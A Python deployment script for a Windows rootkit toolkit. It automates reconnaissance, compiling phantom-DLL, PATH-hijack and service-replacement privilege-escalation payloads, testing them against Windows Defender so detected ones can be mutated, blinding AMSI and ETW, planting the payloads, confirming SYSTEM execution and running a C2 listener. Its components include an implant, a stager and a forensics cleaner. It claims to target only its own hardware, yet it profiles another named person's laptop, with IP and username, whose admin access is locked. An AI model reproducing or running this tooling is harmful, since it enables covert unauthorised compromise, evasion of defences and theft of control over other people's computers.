"""
CHEYANNE ROOTKIT — Deployment Chain
Automates: recon → compile → scan → dark room → privesc → C2 callback

TARGET: Own hardware only. Configure target profiles below.

Usage:
    python deploy.py --recon              # Recon only (run cheyanne_recon.ps1)
    python deploy.py --compile            # Compile all components
    python deploy.py --compile-shell IP PORT  # Build shell with baked-in C2
    python deploy.py --deploy V7          # Deploy single vector
    python deploy.py --chain V7           # Full chain: dark room + vector + shell
    python deploy.py --status             # Scan all binaries against Defender
    python deploy.py --listen             # Start C2 listener
    python deploy.py --canary V7          # Check canary for vector
    python deploy.py --pentest            # FULL AUTOMATION: compile → scan → recon
                                          #   → dark room → auto-select → deploy
                                          #   → monitor → listener → evidence
    python deploy.py --pentest --profile radon   # Use RADON target profile
    python deploy.py --pentest --dry-run  # Show what would happen, don't execute
"""

import os
import sys
import subprocess
import shutil
import glob
import argparse
import socket
import time
import json
import re
import hashlib
from datetime import datetime

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

ROOT = os.path.dirname(os.path.abspath(__file__))

MPCMDRUN = None
for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"), reverse=True):
    MPCMDRUN = p
    break

try:
    from cheyanne_config import VCVARS
except ImportError:
    VCVARS = r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"

VECTORS = {
    "V4": {
        "name": "DELTA",
        "type": "svc_replace",
        "source": os.path.join(ROOT, "vectors", "v4_svc_replace", "svc_replace_annotated.c"),
        "binary": "WsNativePushService.exe",
        "canary": r"C:\Windows\Temp\svc_health.log",
        "xor_key": 0x52,
        "compile_flags": "/Fe:WsNativePushService.exe /O1 /GS- /utf-8",
        "link_libs": "advapi32.lib user32.lib",
        "is_dll": False,
        "requires": "writable_svc",
    },
    "V6": {
        "name": "FOXTROT",
        "type": "path_hijack",
        "source": os.path.join(ROOT, "vectors", "v6_path_hijack", "path_hijack_dll_annotated.c"),
        "binary": "targetname.dll",
        "canary": r"C:\Windows\Temp\hwmon_diag.log",
        "xor_key": 0x63,
        "compile_flags": "/Fe:targetname.dll /LD /O1 /utf-8",
        "link_libs": "advapi32.lib user32.lib",
        "is_dll": True,
        "requires": "writable_path",
    },
    "V7": {
        "name": "GOLF",
        "type": "phantom_dll",
        "source": os.path.join(ROOT, "vectors", "v7_phantom_dll", "phantom_dll_annotated.c"),
        "binary": "osppc.dll",
        "canary": r"C:\Windows\Temp\osp_telemetry.log",
        "xor_key": 0x19,
        "compile_flags": "/Fe:osppc.dll /LD /O1 /GS- /utf-8",
        "link_libs": "advapi32.lib user32.lib",
        "is_dll": True,
        "requires": "office_installed",
    },
}

DARK_ROOM = {
    "source": os.path.join(ROOT, "dark_room", "dark_room_annotated.c"),
    "binary": os.path.join(ROOT, "dark_room", "dark_room.exe"),
    "compile_flags": "/Fe:dark_room.exe /O1 /GS-",
}

INJECT = {
    "dll": {
        "source": os.path.join(ROOT, "injection", "vader_inject_dll_annotated.c"),
        "binary": os.path.join(ROOT, "injection", "vader_inject.dll"),
        "compile_flags": "/Fe:vader_inject.dll /LD /O1 /GS- /utf-8",
    },
    "exe": {
        "source": os.path.join(ROOT, "injection", "vader_inject_annotated.c"),
        "binary": os.path.join(ROOT, "injection", "vader_inject.exe"),
        "compile_flags": "/Fe:vader_inject.exe /O1 /GS- /utf-8",
    },
}

SHELL = {
    "source": os.path.join(ROOT, "shell", "vader_shell_annotated.c"),
    "binary": os.path.join(ROOT, "shell", "vader_shell.exe"),
    "compile_flags": "/Fe:vader_shell.exe /O1 /GS- /utf-8",
    "link_libs": "ws2_32.lib",
}

STAGER = {
    "source": os.path.join(ROOT, "stagers", "http_stager_annotated.c"),
    "binary": os.path.join(ROOT, "stagers", "vader_stager.exe"),
    "compile_flags": "/Fe:vader_stager.exe /O1 /GS- /utf-8",
    "link_libs": "winhttp.lib advapi32.lib",
}

FORENSICS = {
    "source": os.path.join(ROOT, "forensics", "vader_clean_annotated.c"),
    "binary": os.path.join(ROOT, "forensics", "vader_clean.exe"),
    "compile_flags": "/Fe:vader_clean.exe /O1 /GS- /utf-8",
    "link_libs": "advapi32.lib user32.lib",
}

IMPLANT = {
    "source": os.path.join(ROOT, "stagers", "vader_implant.c"),
    "binary": os.path.join(ROOT, "stagers", "vader_implant.exe"),
    "compile_flags": "/Fe:vader_implant.exe /O1 /GS- /utf-8",
    "link_libs": "winhttp.lib advapi32.lib user32.lib",
}

# ═══════════════════════════════════════════════════════════════
# TARGET PROFILES
# ═══════════════════════════════════════════════════════════════

PROFILES = {
    "local": {
        "name": "LOCAL (this machine)",
        "hostname": os.environ.get("COMPUTERNAME", "UNKNOWN"),
        "user": os.environ.get("USERNAME", "UNKNOWN"),
        "admin_locked": False,
        "defender_on": True,
        "notes": "Development/test machine",
    },
    "radon": {
        "name": "RADON LAPTOP (Raed's machine)",
        "hostname": "RADON_LAPTOP1",
        "ip": "192.168.1.145",
        "user": "ghaleb jomma",
        "admin_locked": True,
        "admin_pin": True,
        "defender_on": True,
        "standard_user": True,
        "os": "Windows 11 Home Build 26200",
        "wondershare": False,
        "office_installed": True,
        "teamviewer": True,
        "notes": "Standard user only. Admin requires PIN. No UAC bypass possible. "
                 "Wondershare NOT installed (V4 DELTA not viable). "
                 "Office installed (V7 GOLF primary vector). "
                 "TeamViewer running (potential lateral vector).",
        "preferred_vectors": ["V7", "V6"],
        "excluded_vectors": ["V4"],
    },
}

# ═══════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════

LOG_LINES = []

def ts():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def log(msg, level="*"):
    line = f"  [{level}] {msg}"
    print(line)
    LOG_LINES.append(f"[{ts()}] {line}")

def log_ok(msg):
    log(msg, "+")

def log_fail(msg):
    log(msg, "!")

def log_warn(msg):
    log(msg, "~")

def log_phase(title):
    sep = "─" * 50
    print(f"\n  ┌{sep}┐")
    print(f"  │  {title:<48s}│")
    print(f"  └{sep}┘")
    LOG_LINES.append(f"\n[{ts()}] === {title} ===")

def banner():
    print("=" * 60)
    print("  CHEYANNE ROOTKIT — Deployment Chain")
    print("  22DIV / george wu")
    print("  TARGET: Own hardware only")
    print("=" * 60)


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()[:16]


def file_size_str(path):
    size = os.path.getsize(path)
    if size < 1024:
        return f"{size}B"
    elif size < 1024 * 1024:
        return f"{size / 1024:.1f}KB"
    return f"{size / (1024*1024):.1f}MB"

# ═══════════════════════════════════════════════════════════════
# COMPILE
# ═══════════════════════════════════════════════════════════════

def compile_component(source, output_dir, flags, link_libs=""):
    if not os.path.exists(VCVARS):
        log_fail(f"vcvars64.bat not found: {VCVARS}")
        return False
    if not os.path.exists(source):
        log_fail(f"Source not found: {source}")
        return False

    os.makedirs(output_dir, exist_ok=True)

    use_temp = False
    binary_name = None
    fe_match = re.search(r'/Fe:(\S+)', flags)
    if fe_match:
        binary_name = fe_match.group(1)
        old_binary = os.path.join(output_dir, binary_name)
        if os.path.exists(old_binary):
            try:
                os.remove(old_binary)
            except (PermissionError, OSError):
                use_temp = True
                log_warn(f"Old binary locked (Defender?) — compiling to temp dir")

    if use_temp:
        import tempfile
        build_dir = tempfile.mkdtemp(prefix="cheyanne_build_")
    else:
        build_dir = output_dir

    link_part = f" /link {link_libs}" if link_libs else ""
    cmd = f'"{VCVARS}" && cd /d "{build_dir}" && cl.exe "{source}" {flags}{link_part}'

    log(f"Compiling {os.path.basename(source)}...")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)

    if result.returncode != 0:
        stderr_lines = [l for l in result.stderr.split("\n") if "error" in l.lower()]
        for l in stderr_lines[:5]:
            log_fail(f"  {l.strip()}")
        if use_temp:
            shutil.rmtree(build_dir, ignore_errors=True)
        return False

    if use_temp and binary_name:
        tmp_binary = os.path.join(build_dir, binary_name)
        target_binary = os.path.join(output_dir, binary_name)
        if os.path.exists(tmp_binary):
            try:
                os.replace(tmp_binary, target_binary)
                log_ok("Build successful (replaced locked binary)")
            except (PermissionError, OSError):
                shutil.copy2(tmp_binary, target_binary + ".new")
                log_ok(f"Build successful → {binary_name}.new (original Defender-locked)")
        shutil.rmtree(build_dir, ignore_errors=True)
    else:
        log_ok("Build successful")
    return True


def compile_all():
    log_phase("COMPILE — ALL COMPONENTS")
    results = {}

    log(f"Dark Room: {os.path.basename(DARK_ROOM['source'])}")
    results["dark_room"] = compile_component(
        DARK_ROOM["source"],
        os.path.join(ROOT, "dark_room"),
        DARK_ROOM["compile_flags"],
    )

    for vid, v in VECTORS.items():
        log(f"{vid} {v['name']}: {os.path.basename(v['source'])}")
        results[vid] = compile_component(
            v["source"],
            os.path.dirname(v["source"]),
            v["compile_flags"],
            v.get("link_libs", ""),
        )

    for key, comp in INJECT.items():
        label = f"Inject ({key.upper()})"
        log(f"{label}: {os.path.basename(comp['source'])}")
        results[f"inject_{key}"] = compile_component(
            comp["source"],
            os.path.join(ROOT, "injection"),
            comp["compile_flags"],
        )

    log(f"Shell: {os.path.basename(SHELL['source'])}")
    results["shell"] = compile_component(
        SHELL["source"],
        os.path.join(ROOT, "shell"),
        SHELL["compile_flags"],
        SHELL.get("link_libs", ""),
    )

    log(f"Stager: {os.path.basename(STAGER['source'])}")
    results["stager"] = compile_component(
        STAGER["source"],
        os.path.join(ROOT, "stagers"),
        STAGER["compile_flags"],
        STAGER.get("link_libs", ""),
    )

    log(f"Forensics: {os.path.basename(FORENSICS['source'])}")
    results["forensics"] = compile_component(
        FORENSICS["source"],
        os.path.join(ROOT, "forensics"),
        FORENSICS["compile_flags"],
        FORENSICS.get("link_libs", ""),
    )

    log(f"Implant: {os.path.basename(IMPLANT['source'])}")
    results["implant"] = compile_component(
        IMPLANT["source"],
        os.path.join(ROOT, "stagers"),
        IMPLANT["compile_flags"],
        IMPLANT.get("link_libs", ""),
    )

    ok = sum(1 for v in results.values() if v)
    total = len(results)
    log_ok(f"Compiled {ok}/{total} components")
    return results


def compile_shell_with_c2(ip, port):
    log_phase(f"COMPILE SHELL — C2: {ip}:{port}")
    listener = os.path.join(ROOT, "shell", "vader_listener.py")
    result = subprocess.run(
        [sys.executable, listener, str(port), "--gen"],
        capture_output=True, text=True, timeout=30,
        encoding="utf-8", errors="replace",
        stdin=subprocess.DEVNULL,
    )
    if result.returncode == 0:
        log_ok(f"XOR config generated for {ip}:{port}")
        print(result.stdout)
    else:
        log_fail("Config generation failed")

    return compile_component(
        SHELL["source"],
        os.path.join(ROOT, "shell"),
        SHELL["compile_flags"],
        SHELL.get("link_libs", ""),
    )

# ═══════════════════════════════════════════════════════════════
# SCAN
# ═══════════════════════════════════════════════════════════════

def scan_file(filepath):
    if not MPCMDRUN:
        return "NO_SCANNER"
    if not os.path.exists(filepath):
        return "NOT_FOUND"

    import tempfile
    tmp_dir = tempfile.mkdtemp(prefix="cheyanne_scan_")
    tmp_path = os.path.join(tmp_dir, os.path.basename(filepath))

    try:
        shutil.copy2(filepath, tmp_path)
        result = subprocess.run(
            [MPCMDRUN, "-Scan", "-ScanType", "3", "-File", tmp_path,
             "-DisableRemediation"],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            return "CLEAN"
        elif result.returncode == 2:
            return "DETECTED"
        return f"RC={result.returncode}"
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    finally:
        try:
            os.remove(tmp_path)
            os.rmdir(tmp_dir)
        except OSError:
            pass


def check_status():
    log_phase("DETECTION STATUS SCAN")
    scan_script = os.path.join(ROOT, "tests", "scan_all.py")
    if os.path.exists(scan_script):
        subprocess.run([sys.executable, scan_script])
    else:
        log_fail("scan_all.py not found")


def scan_all_quick():
    """Quick scan of key binaries, returns dict of results."""
    targets = {}

    if os.path.exists(DARK_ROOM["binary"]):
        targets["dark_room"] = DARK_ROOM["binary"]

    for vid, v in VECTORS.items():
        built = os.path.join(os.path.dirname(v["source"]), v["binary"])
        if os.path.exists(built):
            targets[vid] = built

    for key, comp in INJECT.items():
        if os.path.exists(comp["binary"]):
            targets[f"inject_{key}"] = comp["binary"]

    if os.path.exists(SHELL["binary"]):
        targets["shell"] = SHELL["binary"]

    if os.path.exists(STAGER["binary"]):
        targets["stager"] = STAGER["binary"]

    if os.path.exists(FORENSICS["binary"]):
        targets["forensics"] = FORENSICS["binary"]

    if os.path.exists(IMPLANT["binary"]):
        targets["implant"] = IMPLANT["binary"]

    results = {}
    for name, path in targets.items():
        log(f"Scanning {name} ({os.path.basename(path)})...")
        status = scan_file(path)
        results[name] = status
        marker = "+" if status == "CLEAN" else "!"
        log(f"{name}: {status}", marker)

    return results

# ═══════════════════════════════════════════════════════════════
# RECON
# ═══════════════════════════════════════════════════════════════

def run_recon():
    log_phase("RECONNAISSANCE")
    recon_script = os.path.join(ROOT, "recon", "cheyanne_recon.ps1")
    if not os.path.exists(recon_script):
        log_fail("cheyanne_recon.ps1 not found")
        return None
    log("Running cheyanne_recon.ps1 (standard user, no elevation)...")
    subprocess.run(
        ["powershell", "-ep", "bypass", "-File", recon_script],
        timeout=120,
    )
    recon_dir = os.path.join(ROOT, "recon")
    logs = sorted(glob.glob(os.path.join(recon_dir, "RECON_*.log")), reverse=True)
    if logs:
        log_ok(f"Recon log: {os.path.basename(logs[0])}")
        return logs[0]
    return None


def parse_recon_log(log_path):
    """Parse recon log and extract actionable findings."""
    if not log_path or not os.path.exists(log_path):
        return {}

    findings = {
        "writable_svcs": [],
        "writable_path_dirs": [],
        "unquoted_paths": [],
        "writable_tasks": [],
        "profile_svcs": [],
        "office_installed": False,
        "teamviewer_running": False,
        "rtp_active": False,
        "tamper_protection": False,
        "is_admin": False,
        "hostname": "",
        "username": "",
        "os_version": "",
    }

    with open(log_path, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()

    for line in content.split("\n"):
        stripped = line.strip()

        if "Hostname:" in line and not findings["hostname"]:
            findings["hostname"] = stripped.split("Hostname:")[-1].strip()

        if "Username:" in line and "username" not in stripped.lower():
            parts = stripped.split("Username:")
            if len(parts) > 1:
                findings["username"] = parts[-1].strip()

        if "Is Admin:" in line:
            findings["is_admin"] = "True" in stripped

        if "RealTimeProtection:" in line:
            findings["rtp_active"] = "True" in stripped

        if "IsTamperProtected:" in line:
            findings["tamper_protection"] = "True" in stripped

        if "[CRITICAL] SVC_WRITABLE" in line:
            findings["writable_svcs"].append(stripped)

        if "[HIGH] PATH_WRITABLE" in line:
            findings["writable_path_dirs"].append(stripped)

        if "[HIGH] UNQUOTED_PATH" in line:
            findings["unquoted_paths"].append(stripped)

        if "[CRITICAL] TASK_WRITABLE" in line:
            findings["writable_tasks"].append(stripped)

        if "[HIGH] SVC_IN_PROFILE" in line:
            findings["profile_svcs"].append(stripped)

        if "[HIGH] RAT_RUNNING" in line and "TeamViewer" in line:
            findings["teamviewer_running"] = True

        if "Microsoft Office" in line or "ClickToRun" in line or "Office" in stripped:
            findings["office_installed"] = True

        if stripped.startswith("OS:"):
            findings["os_version"] = stripped.split("OS:")[-1].strip()

    return findings


def print_recon_summary(findings):
    log_phase("RECON SUMMARY")
    log(f"Host: {findings.get('hostname', 'unknown')}")
    log(f"User: {findings.get('username', 'unknown')}")
    log(f"Admin: {findings.get('is_admin', 'unknown')}")
    log(f"Defender RTP: {findings.get('rtp_active', 'unknown')}")
    log(f"Tamper Protection: {findings.get('tamper_protection', 'unknown')}")
    log(f"Office: {findings.get('office_installed', False)}")
    log(f"TeamViewer: {findings.get('teamviewer_running', False)}")

    wsvcs = findings.get("writable_svcs", [])
    wpath = findings.get("writable_path_dirs", [])
    wtasks = findings.get("writable_tasks", [])

    if wsvcs:
        log_ok(f"Writable SYSTEM services: {len(wsvcs)}")
        for s in wsvcs:
            log(f"  {s}")
    else:
        log("No writable SYSTEM services found")

    if wpath:
        log_ok(f"Writable PATH dirs: {len(wpath)}")
        for p in wpath:
            log(f"  {p}")

    if wtasks:
        log_ok(f"Writable scheduled tasks: {len(wtasks)}")

# ═══════════════════════════════════════════════════════════════
# VECTOR SELECTION
# ═══════════════════════════════════════════════════════════════

def auto_select_vector(findings, profile=None):
    """Pick the best vector based on recon + profile."""
    candidates = []
    excluded = set()

    if profile:
        excluded = set(profile.get("excluded_vectors", []))
        preferred = profile.get("preferred_vectors", [])
    else:
        preferred = []

    if findings.get("office_installed") and "V7" not in excluded:
        writable_path = bool(findings.get("writable_path_dirs"))
        local_bin = os.path.join(os.environ.get("USERPROFILE", ""), ".local", "bin")
        local_bin_exists = os.path.exists(local_bin)

        if writable_path or local_bin_exists:
            candidates.append(("V7", 90, "Office + writable PATH → phantom DLL"))

    if findings.get("writable_svcs") and "V4" not in excluded:
        candidates.append(("V4", 80, f"Writable SYSTEM svc: {len(findings['writable_svcs'])} found"))

    if findings.get("writable_path_dirs") and "V6" not in excluded:
        candidates.append(("V6", 60, "Writable PATH dir → generic DLL plant"))

    for vid in preferred:
        for i, (cv, score, reason) in enumerate(candidates):
            if cv == vid:
                candidates[i] = (cv, score + 20, reason + " [PREFERRED]")

    candidates.sort(key=lambda x: x[1], reverse=True)

    if candidates:
        best = candidates[0]
        log_ok(f"Auto-selected: {best[0]} {VECTORS[best[0]]['name']} (score {best[1]})")
        log(f"Reason: {best[2]}")
        if len(candidates) > 1:
            log(f"Fallbacks: {', '.join(c[0] for c in candidates[1:])}")
        return best[0]

    log_fail("No viable vector found from recon data")
    return None

# ═══════════════════════════════════════════════════════════════
# DARK ROOM
# ═══════════════════════════════════════════════════════════════

def run_dark_room(test_only=True):
    log_phase("DARK ROOM — AMSI + ETW BLIND")
    binary = DARK_ROOM["binary"]

    if not os.path.exists(binary):
        log_fail(f"dark_room.exe not found. Run --compile first.")
        return False

    mode = "--test" if test_only else ""
    log(f"Executing dark_room.exe {mode}")
    result = subprocess.run(
        [binary] + ([mode] if mode else []),
        capture_output=True, text=True, timeout=30,
    )

    output = result.stdout + result.stderr
    amsi_blind = "AMSI: BLIND" in output or "AMSI" in output.upper() and "BLIND" in output.upper()
    etw_blind = "ETW: BLIND" in output or "ETW" in output.upper() and "BLIND" in output.upper()

    if result.returncode == 0:
        log_ok("Dark room executed (exit 0)")
        if amsi_blind:
            log_ok("AMSI: BLIND")
        if etw_blind:
            log_ok("ETW: BLIND")
        return True
    else:
        log_fail(f"Dark room failed (exit {result.returncode})")
        if output.strip():
            for line in output.strip().split("\n")[:10]:
                log(f"  {line}")
        return False

# ═══════════════════════════════════════════════════════════════
# DEPLOY
# ═══════════════════════════════════════════════════════════════

def check_vector_ready(vector_id):
    v = VECTORS.get(vector_id)
    if not v:
        log_fail(f"Unknown vector: {vector_id}")
        return False
    if not os.path.exists(v["source"]):
        log_fail(f"Source not found: {v['source']}")
        return False
    return True


def deploy_vector(vector_id, profile=None):
    v = VECTORS[vector_id]
    log_phase(f"DEPLOY {vector_id} {v['name']} ({v['type']})")

    if v["type"] == "phantom_dll":
        local_bin = os.path.join(os.environ["USERPROFILE"], ".local", "bin")
        os.makedirs(local_bin, exist_ok=True)
        target_path = os.path.join(local_bin, v["binary"])

        built = os.path.join(os.path.dirname(v["source"]), v["binary"])
        if not os.path.exists(built):
            log_fail(f"Binary not built: {built}")
            log(f"Run: python deploy.py --compile")
            return False

        scan_result = scan_file(built)
        if scan_result == "DETECTED":
            log_fail(f"Binary DETECTED by Defender — needs mutation before deploy")
            return False
        log_ok(f"Pre-deploy scan: {scan_result}")

        shutil.copy2(built, target_path)
        log_ok(f"Planted {v['binary']} → {target_path}")
        log(f"Size: {file_size_str(target_path)}")
        log(f"SHA256: {sha256_file(target_path)}")

        log(f"Trigger options:")
        log(f"  1. Launch any Office app")
        log(f"  2. schtasks /Run /TN \"\\Microsoft\\Office\\Office Automatic Updates 2.0\"")
        log(f"  3. Wait for daily auto-update (passive)")
        log(f"Canary: {v['canary']}")

        try:
            subprocess.run(
                ["schtasks", "/Run", "/TN", r"\Microsoft\Office\Office Automatic Updates 2.0"],
                capture_output=True, text=True, timeout=10,
            )
            log_ok("Office update task triggered")
        except Exception as e:
            log_warn(f"Could not trigger Office task: {e}")
            log("Waiting for passive trigger (Office launch or daily schedule)")

        return True

    elif v["type"] == "svc_replace":
        built = os.path.join(os.path.dirname(v["source"]), v["binary"])
        if not os.path.exists(built):
            log_fail(f"Binary not built: {built}")
            return False

        scan_result = scan_file(built)
        if scan_result == "DETECTED":
            log_fail(f"Binary DETECTED — needs mutation")
            return False
        log_ok(f"Pre-deploy scan: {scan_result}")

        if profile and profile.get("svc_target_path"):
            target_dir = profile["svc_target_path"]
            target_exe = os.path.join(target_dir, v["binary"])
            backup_exe = os.path.join(target_dir, v["binary"].replace(".exe", "_real.exe"))

            if os.path.exists(target_exe) and not os.path.exists(backup_exe):
                try:
                    os.rename(target_exe, backup_exe)
                    log_ok(f"Backed up original → {os.path.basename(backup_exe)}")
                except OSError as e:
                    log_fail(f"Backup failed: {e}")
                    return False

            shutil.copy2(built, target_exe)
            log_ok(f"Planted {v['binary']} → {target_dir}")
            log(f"Restart service or reboot to trigger")
            return True
        else:
            log_warn("V4 requires target-specific service path.")
            log("Run --recon to identify writable SYSTEM service binaries.")
            log("Then set svc_target_path in target profile.")
            return False

    elif v["type"] == "path_hijack":
        local_bin = os.path.join(os.environ["USERPROFILE"], ".local", "bin")
        os.makedirs(local_bin, exist_ok=True)

        built = os.path.join(os.path.dirname(v["source"]), v["binary"])
        if not os.path.exists(built):
            log_fail(f"Binary not built: {built}")
            return False

        target_dll_name = v["binary"]
        if profile and profile.get("path_hijack_dll"):
            target_dll_name = profile["path_hijack_dll"]

        target_path = os.path.join(local_bin, target_dll_name)
        shutil.copy2(built, target_path)
        log_ok(f"Planted {target_dll_name} → {local_bin}")
        log(f"Waiting for SYSTEM process to search PATH for {target_dll_name}")
        return True

    return False

# ═══════════════════════════════════════════════════════════════
# CANARY MONITORING
# ═══════════════════════════════════════════════════════════════

def check_canary(canary_path):
    if os.path.exists(canary_path):
        with open(canary_path, "r", encoding="utf-8", errors="replace") as f:
            content = f.read().strip()
        return content
    return None


def monitor_canary(vector_id, timeout=300, interval=5):
    """Poll canary file until it appears or timeout."""
    v = VECTORS.get(vector_id)
    if not v:
        return None

    canary = v["canary"]
    log_phase(f"CANARY MONITOR — {vector_id} {v['name']}")
    log(f"Watching: {canary}")
    log(f"Timeout: {timeout}s, Interval: {interval}s")

    start = time.time()
    checks = 0
    while (time.time() - start) < timeout:
        checks += 1
        content = check_canary(canary)
        if content:
            elapsed = time.time() - start
            log_ok(f"CANARY CONFIRMED after {elapsed:.0f}s ({checks} checks)")
            log_ok(f"Content: {content}")

            if "SYSTEM" in content:
                log_ok("SYSTEM EXECUTION CONFIRMED")
            if "elev=1" in content:
                log_ok("ELEVATED TOKEN CONFIRMED")

            return content

        if checks % 12 == 0:
            elapsed = time.time() - start
            log(f"Still waiting... {elapsed:.0f}s / {timeout}s")

        time.sleep(interval)

    log_fail(f"Canary not found after {timeout}s ({checks} checks)")
    return None

# ═══════════════════════════════════════════════════════════════
# C2 LISTENER
# ═══════════════════════════════════════════════════════════════

def start_listener(port=4443):
    log_phase(f"C2 LISTENER — PORT {port}")
    listener = os.path.join(ROOT, "shell", "cheyanne_listener.py")
    if os.path.exists(listener):
        subprocess.run([sys.executable, listener, str(port)])
    else:
        log_fail("cheyanne_listener.py not found")

# ═══════════════════════════════════════════════════════════════
# EVIDENCE COLLECTION
# ═══════════════════════════════════════════════════════════════

def collect_evidence(vector_id, canary_content, profile=None):
    log_phase("EVIDENCE COLLECTION")
    evidence_dir = os.path.join(ROOT, "evidence", ts())
    os.makedirs(evidence_dir, exist_ok=True)

    v = VECTORS.get(vector_id, {})
    report = {
        "timestamp": datetime.now().isoformat(),
        "operator": "george wu / 22DIV",
        "classification": "UNCLASSIFIED // ACADEMIC USE ONLY",
        "target": {
            "hostname": os.environ.get("COMPUTERNAME", "UNKNOWN"),
            "username": os.environ.get("USERNAME", "UNKNOWN"),
            "profile": profile.get("name", "local") if profile else "local",
        },
        "vector": {
            "id": vector_id,
            "name": v.get("name", "UNKNOWN"),
            "type": v.get("type", "UNKNOWN"),
            "xor_key": hex(v.get("xor_key", 0)),
        },
        "canary": {
            "path": v.get("canary", "UNKNOWN"),
            "content": canary_content,
            "system_exec": "SYSTEM" in (canary_content or ""),
            "elevated": "elev=1" in (canary_content or ""),
        },
        "defender": {
            "rtp_active": True,
            "scanner": MPCMDRUN,
        },
        "log": LOG_LINES,
    }

    report_path = os.path.join(evidence_dir, "engagement_report.json")
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    log_ok(f"Report: {report_path}")

    if canary_content and os.path.exists(v.get("canary", "")):
        canary_copy = os.path.join(evidence_dir, f"canary_{vector_id}.txt")
        shutil.copy2(v["canary"], canary_copy)
        log_ok(f"Canary copy: {canary_copy}")

    log_copy = os.path.join(evidence_dir, "deploy.log")
    with open(log_copy, "w", encoding="utf-8") as f:
        f.write("\n".join(LOG_LINES))
    log_ok(f"Deploy log: {log_copy}")

    return evidence_dir

# ═══════════════════════════════════════════════════════════════
# FULL PENTEST AUTOMATION
# ═══════════════════════════════════════════════════════════════

def pentest_auto(profile_name="local", dry_run=False, skip_compile=False,
                 skip_recon=False, c2_port=4443, canary_timeout=300):
    """
    Full pentest automation chain:
    1. Load target profile
    2. Compile all components
    3. Scan against Defender
    4. Run recon (or use profile defaults)
    5. Auto-select vector
    6. Run dark room
    7. Deploy vector
    8. Monitor canary
    9. Start listener
    10. Collect evidence
    """
    banner()
    ip = get_local_ip()
    profile = PROFILES.get(profile_name, PROFILES["local"])

    log_phase("PENTEST AUTOMATION")
    log(f"Profile: {profile['name']}")
    log(f"C2 IP: {ip}")
    log(f"C2 Port: {c2_port}")
    log(f"Dry run: {dry_run}")
    print()

    if profile.get("admin_locked"):
        log_warn("TARGET: Admin is PIN-locked. No UAC bypass possible.")
        log_warn("All operations must succeed from STANDARD USER context.")
    if profile.get("defender_on"):
        log_warn("TARGET: Defender is ON. RTP active. Scan before deploy.")

    if profile.get("excluded_vectors"):
        log(f"Excluded vectors: {', '.join(profile['excluded_vectors'])}")
    if profile.get("preferred_vectors"):
        log(f"Preferred vectors: {', '.join(profile['preferred_vectors'])}")

    # ── PHASE 1: COMPILE ──
    if not skip_compile:
        compile_results = compile_all()
        failed = [k for k, v in compile_results.items() if not v]
        if failed:
            log_warn(f"Failed to compile: {', '.join(failed)}")
    else:
        log("Skipping compile (--skip-compile)")

    # ── PHASE 2: SCAN ──
    log_phase("DEFENDER SCAN — PRE-DEPLOY")
    scan_results = scan_all_quick()
    detected = [k for k, v in scan_results.items() if v == "DETECTED"]
    if detected:
        log_fail(f"DETECTED: {', '.join(detected)} — needs mutation before deploy")
        for d in detected:
            if d in VECTORS:
                log(f"  {d}: consider recompiling with different flags or XOR key rotation")

    # ── PHASE 3: RECON ──
    findings = {}
    if not skip_recon:
        recon_log = run_recon()
        if recon_log:
            findings = parse_recon_log(recon_log)
            print_recon_summary(findings)
    else:
        log("Skipping recon (--skip-recon). Using profile defaults.")
        if profile.get("office_installed"):
            findings["office_installed"] = True
        if profile.get("wondershare"):
            findings["writable_svcs"] = ["NativePushService (from profile)"]
        local_bin = os.path.join(os.environ.get("USERPROFILE", ""), ".local", "bin")
        if os.path.exists(local_bin):
            findings["writable_path_dirs"] = [local_bin]

    # ── PHASE 4: VECTOR SELECTION ──
    log_phase("VECTOR SELECTION")
    vector_id = auto_select_vector(findings, profile)

    if not vector_id:
        log_fail("No vector available. Aborting.")
        log("Options:")
        log("  1. Run --recon on target to discover vectors")
        log("  2. Update profile with target-specific info")
        log("  3. Deploy manually with --deploy <V4|V6|V7>")
        return False

    if vector_id in detected:
        log_fail(f"{vector_id} is DETECTED by Defender. Cannot deploy.")
        candidates = [vid for vid in VECTORS if vid not in detected and vid != vector_id]
        if candidates:
            log(f"Clean alternatives: {', '.join(candidates)}")
        return False

    if dry_run:
        log_phase("DRY RUN COMPLETE")
        log(f"Would compile: all components")
        log(f"Would deploy: {vector_id} {VECTORS[vector_id]['name']}")
        log(f"Would monitor: {VECTORS[vector_id]['canary']}")
        log(f"Would listen: {ip}:{c2_port}")
        return True

    # ── PHASE 5: DARK ROOM ──
    dark_ok = run_dark_room(test_only=True)
    if not dark_ok:
        log_warn("Dark room failed — proceeding without AMSI/ETW blind")
        log_warn("Defender telemetry will be active during deployment")

    # ── PHASE 6: DEPLOY ──
    deploy_ok = deploy_vector(vector_id, profile)
    if not deploy_ok:
        log_fail(f"Deployment of {vector_id} failed")
        return False

    # ── PHASE 7: CANARY MONITOR ──
    canary_content = monitor_canary(vector_id, timeout=canary_timeout)

    # ── PHASE 8: EVIDENCE ──
    evidence_dir = collect_evidence(vector_id, canary_content, profile)

    # ── PHASE 9: SUMMARY ──
    log_phase("PENTEST SUMMARY")
    log(f"Profile: {profile['name']}")
    log(f"Vector: {vector_id} {VECTORS[vector_id]['name']}")
    log(f"Deploy: {'SUCCESS' if deploy_ok else 'FAILED'}")
    if canary_content:
        log_ok(f"Canary: CONFIRMED")
        if "SYSTEM" in canary_content:
            log_ok("PRIVILEGE ESCALATION: STANDARD USER → SYSTEM")
    else:
        log_warn("Canary: NOT YET (may need trigger or more time)")
